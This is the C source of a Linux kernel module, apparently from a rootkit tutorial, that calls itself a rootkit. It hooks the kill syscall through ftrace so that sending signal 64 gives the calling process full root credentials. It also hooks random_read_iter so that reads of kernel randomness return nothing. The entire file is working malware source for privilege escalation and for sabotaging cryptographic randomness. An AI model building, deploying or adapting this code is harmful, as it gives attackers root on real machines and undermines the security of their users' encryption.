#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/syscalls.h>
#include <linux/kallsyms.h>
#include <linux/version.h>

#include "ftrace_helper.h"

MODULE_LICENSE("GPL");
MODULE_AUTHOR("TheXcellerator");
MODULE_DESCRIPTION("Giving root privileges to a process");
MODULE_VERSION("0.02");

kuid_t last_uid;
kgid_t last_gid;
kuid_t last_euid;
kgid_t last_egid;
kuid_t last_fsuid;
kgid_t last_fsgid;

/* After Kernel 4.17.0, the way that syscalls are handled changed
 * to use the pt_regs struct instead of the more familiar function
 * prototype declaration. We have to check for this, and set a
 * variable for later on */
#if defined(CONFIG_X86_64) && (LINUX_VERSION_CODE >= KERNEL_VERSION(4,17,0))
#define PTREGS_SYSCALL_STUBS 1
#endif

/* We now have to check for the PTREGS_SYSCALL_STUBS flag and
 * declare the orig_kill and hook_kill functions differently
 * depending on the kernel version. This is the largest barrier to
 * getting the rootkit to work on earlier kernel versions. The
 * more modern way is to use the pt_regs struct. */
#ifdef PTREGS_SYSCALL_STUBS
static asmlinkage long (*orig_kill)(const struct pt_regs *);

/* We can only modify our own privileges, and not that of another
 * process. Just have to wait for signal 64 (normally unused)
 * and then call the set_root() function. */
asmlinkage int hook_kill(const struct pt_regs *regs)
{
    void set_root(void);

    // pid_t pid = regs->di;
    int sig = regs->si;

    if ( sig == 64 )
    {
        printk(KERN_INFO "rootkit: giving root...\n");
        set_root();
        return 0;
    }

    return orig_kill(regs);

}
#else
/* This is the old way of declaring a syscall hook */
static asmlinkage long (*orig_kill)(pid_t pid, int sig);

static asmlinkage int hook_kill(pid_t pid, int sig)
{
    void set_root(void);
    void del_root(void);

    if ( sig == 64 )
    {
        printk(KERN_INFO "rootkit: giving root...\n");
        set_root();
        return 0;
    }
    else if ( sig == 63)
    {
        printk(KERN_INFO "rootkit: deleting root...\n");
        del_root();
        return 0;
    }

    return orig_kill(pid, sig);
}
#endif

/* Whatever calls this function will have it's creds struct replaced
 * with root's */
void set_root(void)
{
    struct cred *root;

    /* Save all the varioud *id's of current process */
    current_uid_gid(&last_uid, &last_gid);
    current_euid_egid(&last_euid, &last_egid);
    current_fsuid_fsgid(&last_fsuid, &last_fsgid);

    /* prepare_creds returns the current credentials of the process */
    root = prepare_creds();

    if (root == NULL)
        return;

    /* Run through and set all the various *id's to 0 (root) */
    root->uid.val = root->gid.val = 0;
    root->euid.val = root->egid.val = 0;
    root->suid.val = root->sgid.val = 0;
    root->fsuid.val = root->fsgid.val = 0;

    /* Set the cred struct that we've modified to that of the calling process */
    commit_creds(root);
}

void del_root(void)
{
    struct cred *user;
    user = prepare_creds();

    if (user == NULL)
        return;

    /* Restore all the various *id's to that of saved val */
    user->uid.val = last_uid.val;
    user->gid.val = last_gid.val;
    user->euid.val = last_euid.val;
    user->egid.val = last_egid.val;
    user->fsuid.val = last_fsuid.val;
    user->fsgid.val = last_fsgid.val;

    commit_creds(user);
}

static asmlinkage ssize_t orig_random_read_iter(struct kiocb *kiocb, struct iov_iter *iter);

static asmlinkage ssize_t hook_random_read_iter(struct kiocb *kiocb, struct iov_iter *iter) {
  return iter->count;
}

/* Declare the struct that ftrace needs to hook the syscall */
static struct ftrace_hook hooks[] = {
    HOOK("sys_kill", hook_kill, &orig_kill),
    HOOK("random_read_iter", hook_random_read_iter, &orig_random_read_iter),
};

/* Module initialization function */
static int __init rootkit_init(void)
{
    /* Hook the syscall and print to the kernel buffer */
    int err;
    err = fh_install_hooks(hooks, ARRAY_SIZE(hooks));
    if(err)
        return err;

    printk(KERN_INFO "rootkit: Loaded >:-)\n");

    return 0;
}

static void __exit rootkit_exit(void)
{
    /* Unhook and restore the syscall and print to the kernel buffer */
    fh_remove_hooks(hooks, ARRAY_SIZE(hooks));
    printk(KERN_INFO "rootkit: Unloaded :-(\n");
}

module_init(rootkit_init);
module_exit(rootkit_exit);
